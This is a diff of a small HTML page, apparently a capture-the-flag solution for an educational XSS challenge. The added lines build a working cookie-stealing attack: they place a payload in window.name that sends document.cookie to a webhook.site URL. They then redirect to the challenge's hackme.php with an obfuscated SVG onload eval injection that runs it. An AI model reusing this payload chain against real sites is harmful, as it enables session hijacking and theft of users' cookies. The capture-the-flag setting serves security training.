@@ -10,10 +10,11 @@ document.getElementById('x').click();
 	<a id="haha" onclick="getFlag()"></a>
 </body>
 <script type="text/javascript">
-	var a = navigator.userAgent;
+	var a = document.cookie;
 	document.querySelector("#haha").click();
 	function getFlag() {
-        alert(document.cookie)
-		//window.open(`http://webhook.site/2fd1760a-21aa-42fb-b77d-301a171ea69c?${a}`);
+        var a = document.cookie;
+        window.name="document.location=`https://webhook.site/2fd1760a-21aa-42fb-b77d-301a171ea69c?${a}`";
+        window.location="https://edu-ctf.kaibro.tw:30678/hackme.php?q=<SVG/ONLoAD=eval(n%26;m\\u{65})>"
 	}
 </script>
